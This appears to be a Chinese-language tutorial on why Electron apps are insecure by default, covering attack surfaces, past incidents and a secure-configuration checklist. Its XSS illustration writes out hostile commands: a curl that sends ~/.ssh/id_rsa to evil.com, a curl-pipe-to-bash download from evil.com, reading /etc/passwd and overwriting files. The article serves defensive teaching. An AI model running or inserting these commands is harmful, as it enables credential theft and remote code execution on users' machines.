---
title: 为什么 Electron 默认被认为不安全？
category: Electron
difficulty: 高级
updatedAt: 2025-12-11
summary: >-
  分析 Electron 应用面临的安全挑战，理解为什么需要特别注意安全配置，以及如何正确防护。
tags:
  - Electron
  - 安全
  - 漏洞
  - 最佳实践
estimatedTime: 12 分钟
keywords:
  - Electron安全
  - 安全风险
  - 攻击面
highlight: Electron 结合了 Web 和 Node.js 的能力，如果配置不当会带来严重的安全风险
order: 202
---

## 问题 1：Electron 的安全风险来自哪里？

### 核心问题：Web + Node.js 的组合

```
传统 Web 应用：
┌─────────────────────────────────────┐
│         浏览器沙箱                   │
│  ┌─────────────────────────────┐   │
│  │      Web 页面               │   │
│  │  - 只能访问 Web API         │   │
│  │  - 无法访问文件系统         │   │
│  │  - 无法执行系统命令         │   │
│  └─────────────────────────────┘   │
└─────────────────────────────────────┘

Electron 应用（配置不当时）：
┌─────────────────────────────────────┐
│         没有沙箱限制                 │
│  ┌─────────────────────────────┐   │
│  │      Web 页面               │   │
│  │  + Node.js API              │   │
│  │  - 可以访问文件系统 ⚠️       │   │
│  │  - 可以执行系统命令 ⚠️       │   │
│  │  - 可以加载原生模块 ⚠️       │   │
│  └─────────────────────────────┘   │
└─────────────────────────────────────┘
```

### XSS 攻击的升级

```javascript
// 普通 Web 应用的 XSS 攻击
// 攻击者能做的：
// - 窃取 cookie
// - 修改页面内容
// - 发送恶意请求

// Electron 应用（nodeIntegration: true）的 XSS 攻击
// 攻击者能做的：
const { exec } = require("child_process");
exec("curl http://evil.com/steal?data=$(cat ~/.ssh/id_rsa)");

const fs = require("fs");
fs.readFileSync("/etc/passwd");
fs.writeFileSync("/path/to/important", "corrupted");

// 甚至可以安装恶意软件
exec("curl http://evil.com/malware.sh | bash");
```

---

## 问题 2：常见的安全误区有哪些？

### 误区 1：只加载本地文件就安全

```javascript
// ❌ 错误认知：只加载本地文件，所以开启 nodeIntegration 没问题
win.loadFile("index.html");

// 风险：
// 1. 第三方 npm 包可能包含恶意代码
// 2. 用户输入可能导致 XSS
// 3. 加载的图片/字体等资源可能被篡改
```

### 误区 2：桌面应用不需要考虑 Web 安全

```javascript
// ❌ 错误认知：这是桌面应用，不是网站
// 实际上 Electron 应用面临所有 Web 安全问题：
// - XSS（跨站脚本）
// - CSRF（跨站请求伪造）
// - 点击劫持
// - 中间人攻击
```

### 误区 3：用户信任应用就没问题

```javascript
// ❌ 错误认知：用户主动安装了应用，所以信任它
// 风险：
// 1. 应用可能加载远程内容
// 2. 应用可能被中间人攻击
// 3. 应用的依赖可能被供应链攻击
```

---

## 问题 3：Electron 的攻击面有哪些？

### 1. 远程内容加载

```javascript
// 加载远程 URL
win.loadURL("https://example.com");

// 如果这个网站被入侵或有 XSS 漏洞
// 攻击者就能在你的应用中执行代码
```

### 2. 协议处理

```javascript
// 自定义协议可能被利用
app.setAsDefaultProtocolClient("myapp");

// 恶意链接：myapp://evil-payload
// 如果处理不当，可能执行恶意代码
```

### 3. 深度链接

```javascript
// 处理外部链接
app.on("open-url", (event, url) => {
  // 如果不验证 URL，可能被利用
  win.loadURL(url); // ⚠️ 危险
});
```

### 4. 渲染进程漏洞

```javascript
// 渲染进程中的漏洞可能被利用来：
// - 逃逸沙箱
// - 访问主进程
// - 执行任意代码
```

### 5. 供应链攻击

```javascript
// package.json
{
  "dependencies": {
    "malicious-package": "^1.0.0"  // 恶意包
  }
}

// 恶意包可能：
// - 窃取环境变量
// - 修改构建产物
// - 植入后门
```

---

## 问题 4：历史上的 Electron 安全事件

### 案例 1：Atom 编辑器漏洞

```javascript
// 2016 年，Atom 存在漏洞
// 打开恶意 Markdown 文件可以执行任意代码
// 原因：nodeIntegration 开启 + 不安全的内容渲染
```

### 案例 2：VS Code 漏洞

```javascript
// 多次发现可以通过特制文件执行代码的漏洞
// 例如：恶意的 .code-workspace 文件
// 原因：对用户输入验证不足
```

### 案例 3：Slack 漏洞

```javascript
// 2019 年发现的漏洞允许通过恶意链接执行代码
// 原因：自定义协议处理不当
```

---

## 问题 5：如何正确保护 Electron 应用？

### 安全配置清单

```javascript
// ✅ 安全的 BrowserWindow 配置
const win = new BrowserWindow({
  webPreferences: {
    // 1. 禁用 Node.js 集成
    nodeIntegration: false,

    // 2. 启用上下文隔离
    contextIsolation: true,

    // 3. 启用沙箱
    sandbox: true,

    // 4. 使用 preload 脚本
    preload: path.join(__dirname, "preload.js"),

    // 5. 禁用远程模块
    enableRemoteModule: false,

    // 6. 启用 Web 安全
    webSecurity: true,

    // 7. 禁止不安全内容
    allowRunningInsecureContent: false,
  },
});
```

### 内容安全策略

```javascript
// 设置 CSP
session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  callback({
    responseHeaders: {
      ...details.responseHeaders,
      "Content-Security-Policy": [
        "default-src 'self'",
        "script-src 'self'",
        "style-src 'self' 'unsafe-inline'",
      ].join("; "),
    },
  });
});
```

### 验证所有输入

```javascript
// 验证 URL
function isValidUrl(url) {
  try {
    const parsed = new URL(url);
    return ["https:", "file:"].includes(parsed.protocol);
  } catch {
    return false;
  }
}

// 验证文件路径
function isValidPath(filePath) {
  const resolved = path.resolve(filePath);
  return resolved.startsWith(allowedDirectory);
}
```

### 最小权限原则

```javascript
// 只暴露必要的 API
contextBridge.exposeInMainWorld("api", {
  // ✅ 具体的、受限的功能
  saveDocument: (content) => ipcRenderer.invoke("save-doc", content),

  // ❌ 不要暴露通用能力
  // invoke: ipcRenderer.invoke,
  // fs: require('fs')
});
```

## 延伸阅读

- [Electron 安全清单](https://www.electronjs.org/docs/latest/tutorial/security)
- [OWASP Electron 安全指南](https://cheatsheetseries.owasp.org/cheatsheets/Electron_Security_Cheat_Sheet.html)
- [Electron 安全白皮书](https://www.electronjs.org/docs/latest/tutorial/security)
